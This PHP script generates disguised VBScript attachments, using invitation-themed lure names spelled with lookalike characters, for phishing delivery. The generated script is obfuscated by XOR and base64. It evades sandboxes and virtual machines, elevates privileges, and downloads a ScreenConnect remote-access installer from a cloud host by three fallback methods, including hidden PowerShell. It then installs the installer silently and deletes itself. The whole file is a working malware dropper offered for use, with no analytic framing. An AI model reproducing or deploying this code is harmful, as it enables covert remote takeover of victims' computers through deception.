<?php
// invite.php - Full version with 3-method download + dual locks
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Pаrty_Invite",
    "Lettеr_from_Friеnd",
    "Impоrtant_Mail",
    "Fоrmal_Invitatiоn",
    "Invitatiоn_Final",
    "Spеcial_Invitatiоn_VIP",
    "Spеcial_lettеr_VIP",
    "Cеrеmоny_Invite",
    "RSVP_Invitatiоn_Draft",
    "Pеrsоnal_Invite",
    "Elеgant_Invitatiоn_Card",
    "Invitatiоn_Exclusivе",
    "Savе_Thе_Datе_Invitatiоn",
    "Savе_Thе_Datе"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$key = [];
$cipher = [];
$urlLen = strlen($msiUrl);

for ($i = 0; $i < $urlLen; $i++) {
    $k = rand(1, 255);
    $key[] = $k;
    $cipher[] = ord($msiUrl[$i]) ^ $k;
}

function formatArray($arr) {
    $lines = [];
    $chunks = array_chunk($arr, 10);
    foreach ($chunks as $chunk) {
        $hex = array_map(function($v) {
            return "&H" . strtoupper(str_pad(dechex($v), 2, "0", STR_PAD_LEFT));
        }, $chunk);
        $lines[] = "  " . implode(",", $hex);
    }
    return implode(", _\r\n", $lines);
}

$keyFormatted    = formatArray($key);
$cipherFormatted = formatArray($cipher);

$realVbs = <<<REAL
Option Explicit

Dim svc, score, objShell, objFSO, msiURL, mefinuwig, harogilim, i, lockStream, msiLock
score = 0

On Error Resume Next
Set svc = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
If Err.Number <> 0 Then WScript.Quit
On Error GoTo 0

Sub AddFinding(points)
    score = score + points
End Sub

Function ContainsAny(value, needles)
    Dim needle
    ContainsAny = False
    value = LCase(CStr(value))
    For Each needle In needles
        If InStr(value, LCase(CStr(needle))) > 0 Then
            ContainsAny = True
            Exit Function
        End If
    Next
End Function

Dim item, textValue, count, shell, env, userName, computerName

On Error Resume Next

For Each item In svc.ExecQuery("SELECT Manufacturer, Model FROM Win32_ComputerSystem")
    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
    If ContainsAny(textValue, Array("vmware", "virtualbox", "virtual machine", "kvm", "qemu", "xen", "parallels", "hyper-v")) Then
        AddFinding 3
    End If
Next

For Each item In svc.ExecQuery("SELECT Manufacturer, SMBIOSBIOSVersion, SerialNumber FROM Win32_BIOS")
    textValue = CStr(item.Manufacturer) & " " & CStr(item.SMBIOSBIOSVersion) & " " & CStr(item.SerialNumber)
    If ContainsAny(textValue, Array("vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "hyper-v")) Then
        AddFinding 3
    End If
Next

For Each item In svc.ExecQuery("SELECT Model, Manufacturer FROM Win32_DiskDrive")
    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
    If ContainsAny(textValue, Array("vmware", "virtual", "vbox", "qemu", "xen")) Then
        AddFinding 2
    End If
Next

count = 0
For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
    count = count + 1
Next
If count < 35 Then AddFinding 1

Set shell = CreateObject("WScript.Shell")
Set env = shell.Environment("PROCESS")
userName = env("USERNAME")
computerName = env("COMPUTERNAME")
If ContainsAny(userName & " " & computerName, Array("sandbox", "malware", "analysis", "sample", "test")) Then
    AddFinding 1
End If

If score >= 3 Then
    WScript.Sleep 1800000
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' ===== LOCK 1: VBS file =====
Set lockStream = CreateObject("ADODB.Stream")
lockStream.Type = 1
lockStream.Open
lockStream.LoadFromFile WScript.ScriptFullName

mefinuwig = Array( _
$keyFormatted )
harogilim = Array( _
$cipherFormatted )
msiURL = ""
For i = 0 To UBound(harogilim)
  msiURL = msiURL & Chr(harogilim(i) Xor mefinuwig(i))
Next

If WScript.Arguments.Length = 0 Then
    Dim elevShell
    Set elevShell = CreateObject("Shell.Application")
    elevShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit
End If

Sub DownloadAndExecute()
    On Error Resume Next
    Dim p, http, strm, folder, psCmd

    folder = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\\DeployCache6273"
    If Not objFSO.FolderExists(folder) Then
        objFSO.CreateFolder folder
    End If

    p = folder & "\\ScreenConnect.ClientSetup.msi"

    ' ===== Method 1: MSXML2 =====
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", msiURL, False
    http.Send

    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
    Else
        ' ===== Method 2: WinHttp =====
        Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
        http.Open "GET", msiURL, False
        http.Send

        If http.Status = 200 Then
            Set strm = CreateObject("ADODB.Stream")
            strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        Else
            ' ===== Method 3: PowerShell IWR =====
            psCmd = "powershell -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & msiURL & "' -OutFile '" & p & "'"""
            objShell.Run psCmd, 0, True
        End If
    End If

    If objFSO.FileExists(p) Then
        ' ===== LOCK 2: MSI file =====
        Set msiLock = CreateObject("ADODB.Stream")
        msiLock.Type = 1
        msiLock.Open
        msiLock.LoadFromFile p

        objShell.Run """" & p & """ /quiet", 0, True
        WScript.Sleep 90000

        msiLock.Close
        objFSO.DeleteFile p, True
    End If
End Sub

Call DownloadAndExecute

On Error Resume Next
lockStream.Close
objFSO.DeleteFile WScript.ScriptFullName, True

WScript.Quit
REAL;

$chunkSize = 100;
$base64 = base64_encode($realVbs);
$len = strlen($base64);
$count = ceil($len / $chunkSize);

$vbs = "Option Explicit\r\n";
$vbs .= "Dim vuliri(" . ($count - 1) . ")\r\n";

for ($i = 0; $i < $count; $i++) {
    $start = $i * $chunkSize;
    $chunk = substr($base64, $start, $chunkSize);
    $vbs .= "vuliri($i) = \"$chunk\"\r\n";
}

$vbs .= "\r\nDim ojofofi : ojofofi = Join(vuliri, \"\")\r\n";
$vbs .= "ExecuteGlobal ahokehuho(ojofofi)\r\n\r\n";
$vbs .= "Function ahokehuho(s)\r\n";
$vbs .= " Dim cihozot, alemi, nd\r\n";
$vbs .= " Set cihozot = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
$vbs .= " Set nd = cihozot.createElement(\"b\")\r\n";
$vbs .= " nd.dataType = \"bin.base64\"\r\n";
$vbs .= " nd.text = s\r\n";
$vbs .= " Set alemi = CreateObject(\"ADODB.Stream\")\r\n";
$vbs .= " alemi.Type = 1 : alemi.Open\r\n";
$vbs .= " alemi.Write nd.nodeTypedValue\r\n";
$vbs .= " alemi.Position = 0\r\n";
$vbs .= " alemi.Type = 2 : alemi.Charset = \"UTF-8\"\r\n";
$vbs .= " ahokehuho = alemi.ReadText\r\n";
$vbs .= " alemi.Close\r\n";
$vbs .= "End Function\r\n";

echo $vbs;
?>
